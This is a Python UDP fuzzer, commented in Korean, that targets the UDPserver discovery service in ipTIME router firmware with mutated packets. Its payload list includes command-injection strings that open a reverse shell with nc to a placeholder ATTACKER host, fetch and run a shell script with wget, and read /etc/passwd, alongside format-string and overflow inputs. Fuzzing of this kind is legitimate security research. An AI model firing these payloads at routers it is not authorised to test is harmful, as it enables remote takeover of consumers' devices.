"""
ipTIME Firmware Fuzzer - UDP Fuzzer
UDPserver 바이너리 전용 퍼저

타겟: bin/UDPserver (12,080 bytes)
위험 함수: gets(), system(), sprintf(), strcpy(), strcat()
공격 벡터: UDP 패킷 페이로드, 패킷 길이, 필드 파싱
"""

import random
import socket
import struct
from typing import Callable, List, Optional

from .base import BaseFuzzer


class UDPFuzzer(BaseFuzzer):
    """
    ipTIME UDPserver 전용 퍼저

    UDPserver는 ipTIME 공유기의 디스커버리/설정 프로토콜을 처리하며,
    gets()와 system() 사용으로 RCE 취약점 가능성이 높음.
    """

    # ipTIME UDP 프로토콜 상수 (리버싱으로 추정한 값)
    MAGIC_BYTES = [
        b"EFUD",  # EFM ipTIME UDP Discovery
        b"ipTM",  # ipTIME
        b"\x00\x00\x00\x00",  # NULL
        b"\xff\xff\xff\xff",  # All 1s
    ]

    # 명령어 타입 (추정)
    CMD_DISCOVERY = 0x0001
    CMD_GET_CONFIG = 0x0002
    CMD_SET_CONFIG = 0x0003
    CMD_GET_STATUS = 0x0004
    CMD_REBOOT = 0x0005
    CMD_UPGRADE = 0x0006

    def __init__(self, config: dict):
        super().__init__(config)
        self.name = config.get("name", "UDPFuzzer")
        self.target_port = config.get("target_port", 9999)  # ipTIME finder 포트

        # 뮤테이션 전략 가중치
        self.mutation_strategies: List[Callable] = [
            self._mutate_magic,
            self._mutate_command,
            self._mutate_length,
            self._mutate_payload_random,
            self._mutate_payload_overflow,
            self._mutate_format_string,
            self._mutate_command_injection,
            self._mutate_integer_overflow,
        ]

        # 명령어 인젝션 페이로드
        self.cmd_injection_payloads = [
            b"; id",
            b"| id",
            b"`id`",
            b"$(id)",
            b"; cat /etc/passwd",
            b"| cat /etc/passwd",
            b"; ls -la",
            b"| ls -la /",
            b"; nc -e /bin/sh ATTACKER 4444",
            b"`nc -e /bin/sh ATTACKER 4444`",
            b"; wget http://ATTACKER/shell.sh | sh",
            b"\x00; id",  # NULL 바이트 우회
            b"\n; id",  # 개행 우회
        ]

        # 포맷 스트링 페이로드
        self.format_string_payloads = [
            b"%s" * 10,
            b"%s" * 50,
            b"%s" * 100,
            b"%n" * 10,
            b"%x" * 20,
            b"%p" * 20,
            b"AAAA%08x.%08x.%08x.%08x",
            b"%s%s%s%s%s%s%s%s%s%s",
        ]

    def send(self, data: bytes) -> Optional[bytes]:
        """UDP 패킷 전송 및 응답 수신"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(self.timeout)

        try:
            sock.sendto(data, (self.target_host, self.target_port))
            response, addr = sock.recvfrom(4096)
            return response
        except socket.timeout:
            return None
        except Exception as e:
            raise e
        finally:
            sock.close()

    def generate_seed(self) -> bytes:
        """유효한 UDP 패킷 시드 생성"""
        seeds = [
            self._make_discovery_packet(),
            self._make_config_request(),
            self._make_status_request(),
        ]
        return random.choice(seeds)

    def _calculate_checksum(self, data: bytes) -> int:
        """간단한 XOR 체크섬 계산 (ipTIME 프로토콜 추정)"""
        checksum = 0
        for byte in data:
            checksum ^= byte
        return checksum

    def _make_smart_packet(self, cmd: int, payload: bytes) -> bytes:
        """
        체크섬을 포함한 스마트 패킷 생성
        구조: [Magic(4)][Cmd(2)][Len(2)][Checksum(2)][Payload...]
        """
        magic = b"EFUD"
        cmd_bytes = struct.pack("<H", cmd)
        len_bytes = struct.pack("<H", len(payload))

        # 헤더+페이로드 임시 구성
        temp = magic + cmd_bytes + len_bytes + b"\x00\x00" + payload

        # 체크섬 계산 및 삽입
        checksum = self._calculate_checksum(temp)
        chk_bytes = struct.pack("<H", checksum)

        return magic + cmd_bytes + len_bytes + chk_bytes + payload

    def _make_discovery_packet(self) -> bytes:
        """디스커버리 패킷 생성 (스마트)"""
        return self._make_smart_packet(self.CMD_DISCOVERY, b"\x00" * 32)

    def _make_config_request(self) -> bytes:
        """설정 요청 패킷 (스마트)"""
        return self._make_smart_packet(self.CMD_GET_CONFIG, b"get_config\x00")

    def _make_status_request(self) -> bytes:
        """상태 요청 패킷 (스마트)"""
        return self._make_smart_packet(self.CMD_GET_STATUS, b"status\x00")

    def mutate(self, data: bytes) -> bytes:
        """데이터 뮤테이션"""
        strategy = random.choice(self.mutation_strategies)
        return strategy(bytearray(data))

    # ========== 뮤테이션 전략들 ==========

    def _mutate_magic(self, data: bytearray) -> bytes:
        """매직 바이트 변조"""
        if len(data) >= 4:
            new_magic = random.choice(self.MAGIC_BYTES + [bytes([random.randint(0, 255) for _ in range(4)])])
            data[0:4] = new_magic
        return bytes(data)

    def _mutate_command(self, data: bytearray) -> bytes:
        """명령어 필드 변조"""
        if len(data) >= 6:
            # 다양한 명령어 값 테스트
            cmd_values = [
                0x0000,
                0x0001,
                0x0002,
                0x0003,
                0x00FF,
                0xFF00,
                0xFFFF,
                0x7FFF,
                0x8000,
                0xDEAD,
                0xBEEF,
                random.randint(0, 0xFFFF),
            ]
            cmd = random.choice(cmd_values)
            data[4:6] = struct.pack("<H", cmd)
        return bytes(data)

    def _mutate_length(self, data: bytearray) -> bytes:
        """길이 필드 변조 (정수 오버플로우 유도)"""
        if len(data) >= 8:
            # 경계값 및 위험 값
            length_values = [
                0,  # 0 길이
                1,  # 최소
                len(data) - 8,  # 실제 페이로드 길이
                len(data),  # 전체 패킷 길이
                len(data) * 2,  # 2배
                0x7F,  # 127
                0x80,  # 128 (signed 경계)
                0xFF,  # 255
                0x100,  # 256
                0x7FFF,  # 최대 signed short
                0x8000,  # 오버플로우 경계
                0xFFFF,  # 최대 unsigned short
                0xFFFE,  # 최대 - 1
            ]
            length = random.choice(length_values)
            data[6:8] = struct.pack("<H", length)
        return bytes(data)

    def _mutate_payload_random(self, data: bytearray) -> bytes:
        """페이로드 랜덤 바이트 변조"""
        if len(data) > 8:
            num_mutations = random.randint(1, min(10, len(data) - 8))
            for _ in range(num_mutations):
                pos = random.randint(8, len(data) - 1)
                data[pos] = random.randint(0, 255)
        return bytes(data)

    def _mutate_payload_overflow(self, data: bytearray) -> bytes:
        """버퍼 오버플로우 테스트"""
        overflow_sizes = [64, 128, 256, 512, 1024, 2048, 4096, 8192]
        size = random.choice(overflow_sizes)

        # 다양한 패턴
        patterns = [
            b"A" * size,
            b"B" * size,
            bytes([0x41 + (i % 26) for i in range(size)]),  # 순환 패턴
            b"\x00" * size,
            b"\xff" * size,
            # De Bruijn 패턴 (유사)
            bytes([(i >> 8) & 0xFF for i in range(size)]),
        ]

        return bytes(data) + random.choice(patterns)

    def _mutate_format_string(self, data: bytearray) -> bytes:
        """포맷 스트링 공격"""
        payload = random.choice(self.format_string_payloads)

        if len(data) > 8:
            # 페이로드 부분에 삽입
            return bytes(data[:8]) + payload
        else:
            return bytes(data) + payload

    def _mutate_command_injection(self, data: bytearray) -> bytes:
        """명령어 인젝션 공격"""
        payload = random.choice(self.cmd_injection_payloads)

        if len(data) > 8:
            # 기존 페이로드에 추가
            return bytes(data) + payload
        else:
            # 새 패킷에 삽입
            magic = b"EFUD"
            cmd = struct.pack("<H", self.CMD_SET_CONFIG)
            length = struct.pack("<H", len(payload))
            return magic + cmd + length + payload

    def _mutate_integer_overflow(self, data: bytearray) -> bytes:
        """정수 오버플로우 테스트"""
        if len(data) < 8:
            data = bytearray(self.generate_seed())

        # 길이 필드에 큰 값 설정
        data[6:8] = struct.pack("<H", 0xFFFF)

        # 실제 페이로드는 작게
        return bytes(data[:8]) + b"X" * 16

    def is_crash(self, response: Optional[bytes], error: Optional[str]) -> bool:
        """크래시 감지"""
        if error:
            crash_indicators = [
                "Connection refused",
                "Connection reset",
                "No route to host",
                "Network is unreachable",
            ]
            return any(ind in error for ind in crash_indicators)

        # 응답이 없는 경우도 크래시 가능성
        # (서비스가 죽었을 수 있음)
        return False

    def is_interesting(self, response: Optional[bytes]) -> bool:
        """흥미로운 응답 감지"""
        if response is None:
            return False

        interesting_patterns = [
            b"error",
            b"fail",
            b"invalid",
            b"denied",
            b"/bin/",
            b"/etc/",
            b"root:",
            b"uid=",
            b"gid=",
            b"exec",
            b"command",
        ]

        response_lower = response.lower()
        return any(pattern in response_lower for pattern in interesting_patterns)

    def on_crash(self, result):
        """크래시 발견 시 추가 처리"""
        print(f"\n[!!!] POTENTIAL CRASH DETECTED!")
        print(f"      Payload size: {len(result.case.data)}")
        print(f"      Error: {result.error}")
